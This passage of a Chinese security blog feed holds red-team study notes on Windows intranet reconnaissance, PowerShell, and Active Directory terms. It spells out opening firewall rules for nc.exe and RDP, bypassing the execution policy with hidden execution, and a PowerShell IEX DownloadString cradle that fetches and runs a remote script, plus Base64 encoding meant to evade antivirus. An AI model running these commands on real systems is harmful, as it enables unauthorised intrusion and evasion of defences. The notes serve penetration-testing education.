\nc.exe&quot;允许指定程序连出netsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C: \nc.exe&quot;允许 3389 端口放行netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</code></pre><ul><li>自定义防火墙日志储存位置</li></ul><pre><code>netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</code></pre></li><li><p>查看计算机代理配置情况 </p></li></ul><pre><code>reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</code></pre><ul><li><p>查询并开启远程连接服务</p><ul><li>查看远程连接端口（0xd3d换成10进制即3389）</li></ul><pre><code>REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /V PortNumber</code></pre><ul><li>在Windows Server 2003 中开启3389 端口</li></ul><pre><code>wmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1</code></pre><ul><li>在Windows Server 2008 和Windows Server 2012 中开启3389 端口</li></ul><pre><code>wmic /namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1wmic /namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName=&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre></li></ul><h2 id="2、自动收集本地工作组信息"><a href="#2、自动收集本地工作组信息" class="headerlink" title="2、自动收集本地工作组信息"></a>2、自动收集本地工作组信息</h2><h3 id="wmic-脚本"><a href="#wmic-脚本" class="headerlink" title="wmic 脚本"></a>wmic 脚本</h3><p>wmic 脚本下载地址：<a href="https://www.fuzzysecurity.com/scripts/files/wmic_info.rar">https://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></p><p>直接将脚本在目标主机上运行，运行结束后会生成一个 output.html 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_12-59-56.png"></p><h3 id="PowerShsell-Empire"><a href="#PowerShsell-Empire" class="headerlink" title="PowerShsell Empire"></a>PowerShsell Empire</h3><p>PowerShsell Empire中文简称 “帝国” ，是一款针对 Windows 系统平台而打造的渗透工具，以下是 Empire 和万能的 MSF 的一些区别。</p><ul><li><p>MSF 是全平台的，无论是win，linux，mac都可以打，但 Empire 是只针对 Windows 的</p></li><li><p>MSF 集信息收集，渗透，后渗透，木马，社工的功能为一体，全面多能；而 Empire 专注于内网渗透，它是针对 PowerShell 的</p></li></ul><p>当使用 Empire 使主机上线后，可调用<code>powershell/situational_awareness/host/winenum</code>模块查看本机用户信息、系统基本信息、剪贴板等等信息。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-11_15-27-11.png"></p><p>调用<code>powershell/situational_awareness/host/computerdetails</code>模块可查看更丰富的信息，比如RDP登录信息、主机时间日志等等，在运行这个模块时需要管理员权限。</p><blockquote><p>参考链接：</p><p><a href="https://www.freebuf.com/sectool/158393.html">https://www.freebuf.com/sectool/158393.html</a></p><p><a href="https://www.freebuf.com/articles/system/114731.html">https://www.freebuf.com/articles/system/114731.html</a></p><p><a href="https://blog.csdn.net/bring_coco/article/details/113550173">https://blog.csdn.net/bring_coco/article/details/113550173</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、手动收集本地工作组信息&quot;&gt;&lt;a href=&quot;#1、手动收集本地工作组信息&quot; class=&quot;headerlink&quot; title=&quot;1、手动收集本地工作组信息&quot;&gt;&lt;/a&gt;1、手动收集本地工作组信息&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;查看当前权限&lt;/li&gt;
&lt;/ul&gt;
&lt;p</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】2、PowerShell</title>
    <link href="https://www.teamssix.com/year/210206-191859.html"/>
    <id>https://www.teamssix.com/year/210206-191859.html</id>
    <published>2021-02-06T11:18:59.000Z</published>
    <updated>2021-02-06T11:21:28.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 PowerShell 还能做很多 cmd 不能做的事情。</p><p>PowerShell 内置在 Windows 7、Windows Server 2008 R2 及更高版本的 Windows 系统中，同时 PowerShell 是构建在 .NET 平台上的，所有命令传递的都是 .NET 对象。</p><p>PowerShell 有如下特点：</p><ul><li>Windows 7 以上的操作系统默认安装</li><li>PowerShell 脚本可以运行在内存中，不需要写入磁盘</li><li>可以从另一个系统中下载 PowerShell 脚本并执行</li><li>目前很多工具都是基于 PowerShell 开发的</li><li>很多安全软件检测不到 PowerShell 的活动</li><li>cmd 通常会被阻止运行，但是 PowerShell 不会</li><li>可以用来管理活动目录</li></ul><p>可输入 Get-Host 或者 $PSVersionTable 查看 PowerShell 版本：</p><pre><code>PS C:\Users\teamssix&gt; Get-HostName             : ConsoleHostVersion          : 5.1.18362.1171InstanceId       : a0a6f8f2-f86a-477f-bf4b-b94b452bee3cUI               : System.Management.Automation.Internal.Host.InternalHostUserInterfaceCurrentCulture   : zh-CNCurrentUICulture : zh-CNPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxyDebuggerEnabled  : TrueIsRunspacePushed : FalseRunspace         : System.Management.Automation.Runspaces.LocalRunspace</code></pre><pre><code>PS C:\Users\teamssix&gt; $PSVersionTableName                           Value----                           -----PSVersion                      5.1.18362.1171PSEdition                      DesktopPSCompatibleVersions           &#123;1.0, 2.0, 3.0, 4.0...&#125;BuildVersion                   10.0.18362.1171CLRVersion                     4.0.30319.42000WSManStackVersion              3.0PSRemotingProtocolVersion      2.3SerializationVersion           1.1.0.1</code></pre><p>Windows 操作系统对应的 PowerShell 版本信息：</p><p>1.0        windows server 2008</p><p>2.0        windows server 2008 r2、windows 7</p><p>3.0        windows server 2012、windows 8</p><p>4.0        windows server 2012 r2、windows 8.1</p><p>5.0        windows 10</p><p>5.1        windows server 2016</p><h2 id="2、基本概念"><a href="#2、基本概念" class="headerlink" title="2、基本概念"></a>2、基本概念</h2><h3 id="ps1-文件"><a href="#ps1-文件" class="headerlink" title="ps1 文件"></a>ps1 文件</h3><p>ps1 是PowerShell 的脚本扩展名，一个 PowerShell 脚本文件其实就是一个简单的文本文件。</p><h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>为了防止恶意脚本在 PowerShell 中被运行，PowerShell 有个执行策略，默认情况下，这个执行策略是受限模式<code>Restricted</code>。</p><p>使用 <code>Get-ExecutionPolicy</code>命令查看当前执行策略</p><pre><code>PS C:\Users\teamssix&gt; Get-ExecutionPolicyRestricted</code></pre><p>执行策略有以下几种：</p><p><strong>Restricted</strong>：不能运行脚本</p><p><strong>RemoteSigned</strong>：本地创建的脚本可以运行，但从网上下载的脚本不能运行（除非它们拥有由受信任的发布者签署的数字签名）</p><p><strong>AllSigned</strong>：仅当脚本由受信任的发布者签名才能运行。 </p><p><strong>Unrestricted</strong>：脚本执行不受限制，不管来自哪里，也不管它们是否有签名。</p><p>使用<code>Set-ExecutionPolicy &lt;policy name&gt;</code>设置执行策略，该命令需要管理员权限</p><pre><code>PS C:\WINDOWS\system32&gt; Set-ExecutionPolicy Unrestricted执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): APS C:\WINDOWS\system32&gt; Get-ExecutionPolicyUnrestricted</code></pre><h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><p>PowerShell 运行脚本的方式和其他 shell 基本一致，可以输入完整路径运行，也可以到 ps1 文件所在目录下去运行，具体如下：</p><pre><code>PS C:\Users\teamssix&gt; C:\t.ps1hello TeamsSixPS C:\Users\teamssix&gt; cd C:\PS C:\&gt; .\t.ps1hello TeamsSix</code></pre><blockquote><p>这里不禁想吐槽一下，在看百度百科的时候关于 PowerShell 运行脚本的描述是这样的：“假设你要运行一个名为a.ps1的脚本，你可以键入 C:\Scripts\aps1，最大的例外是，如果 PowerShell 脚本文件刚好位于你的系统目录中，那么你可以直接在命令提示符命令提示符后键入脚本文件名即可运行”</p><p>这里的“系统目录”是指的啥目录？C:\还是C:\windows\system目录，“最大的例外”又是什么鬼，讲道理读起来有一种机翻的感觉。</p></blockquote><h3 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h3><p>PowerShell 中的管道类似于 linux 中的管道，都是将前一个命令的输出作为另一个命令的输入，两个命令之间使用 “|” 进行连接。</p><p>例如，在 PowerShell 中获取进程信息并以程序 ID 进行排序</p><pre><code>PS C:\&gt; Get-Process | Sort-Object IDHandles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName-------  ------    -----      -----     ------     --  -- -----------      0       0       60          8                 0   0 Idle   3038       0      208       4760                 4   0 System      0      12     7732      81344                88   0 Registry     53       3     1160        752               368   0 smss    256      10     2468       7424               424   0 svchost    662      21     1788       4668               504   0 csrss    160      11     1364       5660               580   0 wininit    653      27    18592     177580               588   1 csrss   1219      67    59660         52       2.59    600   1 WinStore.App    278      14     3108      15656               684   1 winlogon    687      11     5420       9432               724   0 services</code></pre><h2 id="3、一些命令"><a href="#3、一些命令" class="headerlink" title="3、一些命令"></a>3、一些命令</h2><blockquote><p>-NoLogo：启动不显示版权标志的PowerShell</p><p>-WindowStyle Hidden (-W Hidden)：隐藏窗口</p><p>-NoProfile (-NoP)：不加载当前用户的配置文件</p><p>–Enc：执行 base64 编码后的 powershell 脚本字符串</p><p>-ExecutionPolicy Bypass (-Exec Bypass) ：绕过执行安全策略</p><p>-Noexit：执行后不退出Shell，这在使用键盘记录等脚本时非常重要</p><p>-NonInteractive (-Nonl)：非交互模式，PowerShell 不为用户提供交互的提示</p></blockquote><p>在 PowerShell 下，命令的命名规范很一致，都采用了动词-名词的形式，如 Net-Item，动词一般为 Add、New、Get、Remove、Set 等。PowerShell 还兼容 cmd 和 Linux 命令，如查看目录可以使用 dir 或者 ls 。</p><h3 id="文件操作类命令"><a href="#文件操作类命令" class="headerlink" title="文件操作类命令"></a>文件操作类命令</h3><pre><code>新建目录test：New-Item test -ItemType directory删除目录test：Remove-Item test新建文件test.txt：New-Item test.txt -ItemType file新建文件test.txt，内容为 hello：New-Item test.txt -ItemType file -value &quot;hello&quot;删除文件test.txt：Remove-Item test.txt查看文件test.txt内容：Get-Content  test.txt设置文件test.txt内容t：Set-Content  test.txt  -Value &quot;hello&quot;给文件test.txt追加内容：Add-Content test.txt  -Value &quot;,word!&quot;清除文件test.txt内容：Clear-Content test.txt</code></pre><h3 id="绕过本地权限并执行"><a href="#绕过本地权限并执行" class="headerlink" title="绕过本地权限并执行"></a>绕过本地权限并执行</h3><p>上面说到了默认情况下 PowerShell 的执行策略是受限模式<code>Restricted</code>，这就导致了在渗透测试过程中我们需要采用一些方法绕过这个策略，从而执行我们的脚本文件。</p><p>先来看看默认受限模式下执行脚本的情况</p><pre><code>PS C:\Users\teamssix&gt; powerShell.exe Get-ExecutionPolicyRestrictedPS C:\Users\teamssix&gt; PowerShell.exe -File t.ps1无法加载文件 C:\Users\teamssix\t.ps1，因为在此系统上禁止运行脚本。有关详细信息，请参阅 https:/go.microsoft.com/fwlink/?LinkID=135170 中的 about_Execution_Policies。    + CategoryInfo          : SecurityError: (:) []，ParentContainsErrorRecordException    + FullyQualifiedErrorId : UnauthorizedAccess</code></pre><p>这里系统会提示在此系统上禁止运行脚本，但加上 <code>-ExecutionPolicy Bypass</code>即可绕过这个限制</p><pre><code>PS C:\Users\teamssix&gt; cat .\t.ps1echo &quot;Hello TeamsSix&quot;PS C:\Users\teamssix&gt; PowerShell.exe -ExecutionPolicy Bypass -File t.ps1hello TeamsSix</code></pre><h3 id="绕过本地权限并隐藏执行"><a href="#绕过本地权限并隐藏执行" class="headerlink" title="绕过本地权限并隐藏执行"></a>绕过本地权限并隐藏执行</h3><p>加入<code>-WindowStyle Hidden -NoLogo -NonInteractive -NoProfile</code> 即可隐藏执行。</p><pre><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -File t.ps1</code></pre><h3 id="下载远程脚本绕过权限并隐藏执行"><a href="#下载远程脚本绕过权限并隐藏执行" class="headerlink" title="下载远程脚本绕过权限并隐藏执行"></a>下载远程脚本绕过权限并隐藏执行</h3><pre><code>PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&quot;</code></pre><p>或者简写</p><pre><code>PowerShell.exe -Exec Bypass -W Hidden -NoLogo -NonI -NoP &quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&quot;</code></pre><h3 id="利用-Base64-对命令进行编码"><a href="#利用-Base64-对命令进行编码" class="headerlink" title="利用 Base64 对命令进行编码"></a>利用 Base64 对命令进行编码</h3><p>使用 Base64 进行编码主要是为了混淆代码以避免被杀毒软件查杀，经过尝试这里直接使用 Base64 编码是不行的，可以使用 Github 上的一个编码工具，工具下载地址：</p><p><a href="https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py">https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py</a></p><p>下载好后，需要先将要执行的命令保存到文本文件中，这里保存到了 tmp.txt 文本中，之后执行 <code>python ps_encoder.py -s tmp.txt</code> 即可</p><pre><code>&gt;cat tmp.txtIEX(New-Object Net.WebClient).DownloadString(&#39;http://172.16.214.1:8000/t.ps1&#39;)&gt;python ps_encoder.py -s tmp.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</code></pre><p>使用 –Enc 指定 Base64 编码内容</p><pre><code>PowerShell.exe -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEANwAyAC4AMQA2AC4AMgAxADQALgAxADoAOAAwADAAMAAvAHQALgBwAHMAMQAnACkA</code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-06_18-40-25.png"></p><blockquote><p>参考链接：</p><p><a href="https://www.jianshu.com/p/c8f5c374466a">https://www.jianshu.com/p/c8f5c374466a</a></p><p><a href="https://www.cnblogs.com/frendguo/p/11761693.html">https://www.cnblogs.com/frendguo/p/11761693.html</a></p><p><a href="https://www.cnblogs.com/lavender000/p/6931405.html">https://www.cnblogs.com/lavender000/p/6931405.html</a></p><p><a href="https://www.cnblogs.com/coderge/articles/13768824.html">https://www.cnblogs.com/coderge/articles/13768824.html</a></p><p><a href="https://baike.baidu.com/item/Windows%20Power%20Shell">https://baike.baidu.com/item/Windows%20Power%20Shell</a></p><p><a href="https://blog.csdn.net/weixin_45116657/article/details/103449931">https://blog.csdn.net/weixin_45116657/article/details/103449931</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、介绍&quot;&gt;&lt;a href=&quot;#1、介绍&quot; class=&quot;headerlink&quot; title=&quot;1、介绍&quot;&gt;&lt;/a&gt;1、介绍&lt;/h2&gt;&lt;p&gt;PowerShell 可以简单的理解为 cmd 的高级版，cmd 能做的事在 PowerShell 中都能做，但 Power</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】1、内网中常见名词解释</title>
    <link href="https://www.teamssix.com/year/210203-192358.html"/>
    <id>https://www.teamssix.com/year/210203-192358.html</id>
    <published>2021-02-03T11:23:58.000Z</published>
    <updated>2021-02-03T09:33:33.820Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、工作组"><a href="#1、工作组" class="headerlink" title="1、工作组"></a>1、工作组</h2><p><strong>工作组</strong> <code>Work Group</code> 是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p><p>比如在一个网络内，可能有成百上千台工作电脑，如果这些电脑不进行分组，都列在“网上邻居”内，可想而知会有多么乱。</p><p>为了解决这一问题，Windows 9x/NT/2000 引用了“工作组”这个概念，比如一所高校，会分为诸如数学系、中文系之类的，然后数学系的电脑全都列入数学系的工作组中，中文系的电脑全部都列入到中文系的工作组中……如果你要访问某个系别的资源，就在“网上邻居”里找到那个系的工作组名，双击就可以看到那个系别的电脑了。</p><p>在工作组中所有的计算机都是平等的，没有管理与被管理之分，因此工作组网络也称为对等网络。</p><p>所以对于管理者而言，工作组的管理方式有时会不太便于管理，这时候就需要了解域的概念了。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><h3 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域 Domain"></a>域 <code>Domain</code></h3><p> 可以简单的理解成工作组的升级版，如果说工作组是“免费旅店”那么域就是“星级宾馆”；工作组可以随便进进出出，而域则有严格的控制。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样，称为域控制器。</p><h3 id="域控制器-Domain-Controller"><a href="#域控制器-Domain-Controller" class="headerlink" title="域控制器 Domain Controller"></a>域控制器 <code>Domain Controller</code></h3><p>简写为 <code>DC</code>，域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。</p><p>当电脑连入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确的，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，这样就在一定程度上保护了网络上的资源。</p><p>正是因为域控起到了一个身份验证的作用，因此站在渗透的角度来说，拿下域控是至关重要的。拿下了域控，就相当于拿到了整个域内所有计算机的账号和密码。</p><p>而要想实现域环境，就必须要计算机中安装活动目录，也可以说如果在内网中的一台计算机上安装了活动目录，那它就变成了域控制器。在域中除了域控制器还有成员服务器、客户机、独立服务器。</p><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>顾名思义，在一个域下新建了一个域便称其为子域。形象的来说，一个部门一个域，那个如果这个部门还有分部，那每个分部就可被称为子域，这个大的部门便称为父域。每个域中都有独立的安全策略。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。</p><p>树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。</p><p>而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。</p><p>多个域树可以组成一个域林。</p><h3 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h3><p>域林是指由一个或多个没有形成连续名字空间的域树组成，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。</p><p>但域林中的所有域树仍共享同一个表结构、配置和全局目录。域林中的所有域树通过Kerberos 信任关系建立起来，所以每个域树都知道Kerberos信任关系，不同域树可以交叉引用其他域树中的对象。域林都有根域，域林的根域是域林中创建的第一个域，域林中所有域树的根域与域林的根域建立可传递的信任关系.</p><p>比如benet.com.cn,则可以创建同属与一个林的accp.com.cn,他们就在同一个域林里.</p><p>当创建第一个域控制器的时候，就创建了第一个域（也称林根域），和第一个林。</p><p>林，是一个或多个共享公共架构和全局编录的域组成，每个域都有单独的安全策略，和与其他域的信任关系。一个单位可以有多个林。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/%E5%9F%9F%E6%9E%97.png" alt="域林"></p><h2 id="3、活动目录"><a href="#3、活动目录" class="headerlink" title="3、活动目录"></a>3、活动目录</h2><p><strong>活动目录</strong> <code>Active Directory</code> ，简写为 <code>AD</code>，它是 Windows Server 中负责架构中大型网络环境的集中式目录管理服务，在Windows 2000 Server 开始内置于 Windows Server 产品中。</p><p>目录包含了有关各种对象，例如用户、用户组、计算机、域、组织单位（OU）以及安全策略的信息。目录存储在域控上，并且可以被网络应用程序或者服务所访问。</p><p>活动目录就相当于内网中各种资源的一个目录，通过活动目录用户可以快速定位到这些资源的位置。</p><h2 id="4、DMZ"><a href="#4、DMZ" class="headerlink" title="4、DMZ"></a>4、DMZ</h2><p>DMZ <code>demilitarized zone</code> ，中文名为“隔离区”，或称“非军事化区”。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，从而设立的一个非安全系统与安全系统之间的缓冲区。</p><p>DMZ 区可以理解为一个不同于外网或内网的特殊网络区域，DMZ 内通常放置一些不含机密信息的公用服务器，比如 WEB 服务器、E-Mail 服务器、FTP 服务器等。这样来自外网的访问者只可以访问 DMZ 中的服务，但不可能接触到存放在内网中的信息等，即使 DMZ 中服务器受到破坏，也不会对内网中的信息造成影响。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/f603918fa0ec08fadb43804a59ee3d6d54fbda98.jfif"></p><h2 id="5、域内的各种权限"><a href="#5、域内的各种权限" class="headerlink" title="5、域内的各种权限"></a>5、域内的各种权限</h2><p>首先要理解一下组的概念，在组里包含了很多用户，当管理员想要给某个用户分配权限时，只需要将用户加入到对应权限的组里就行，从而提高了管理效率，常见的组有：域本地组、全局组、通用组。</p><p><strong>域本地组</strong></p><p>成员范围：所有的域；使用范围：自己所在的域</p><p><strong>全局组</strong></p><p>成员范围：自己所在的域；使用范围：所有的域</p><p><strong>通用组</strong></p><p>成员范围：所有的域；使用范围：所有的域</p><p><strong>A-G-DL-P 策略</strong></p><p>A-G-DL-P 策略是将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><ul><li>A 表示用户账号</li><li>G 表示全局组</li><li>U 表示通用组</li><li>DL 表示域本地组</li><li>P 表示资源权限</li></ul><blockquote><p>参考链接：</p><p><a href="https://baike.baidu.com/item/DMZ">https://baike.baidu.com/item/DMZ</a></p><p><a href="https://baike.baidu.com/item/AGDLP">https://baike.baidu.com/item/AGDLP</a></p><p><a href="https://zh.wikipedia.org/wiki/Active_Directory">https://zh.wikipedia.org/wiki/Active_Directory</a></p><p><a href="https://baike.baidu.com/item/Windows%E5%9F%9F">https://baike.baidu.com/item/Windows%E5%9F%9F</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91">https://baike.baidu.com/item/%E5%9F%9F%E6%A0%91</a></p><p><a href="https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97">https://baike.baidu.com/item/%E5%9F%9F%E6%9E%97</a></p><p><a href="https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84">https://baike.baidu.com/item/%E5%B7%A5%E4%BD%9C%E7%BB%84</a></p><p><a href="https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95">https://baike.baidu.com/item/%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、工作组&quot;&gt;&lt;a href=&quot;#1、工作组&quot; class=&quot;headerlink&quot; title=&quot;1、工作组&quot;&gt;&lt;/a&gt;1、工作组&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;工作组&lt;/strong&gt; &lt;code&gt;Work Group&lt;/code&gt; 是最常见最简单最普通的资源</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
</feed>
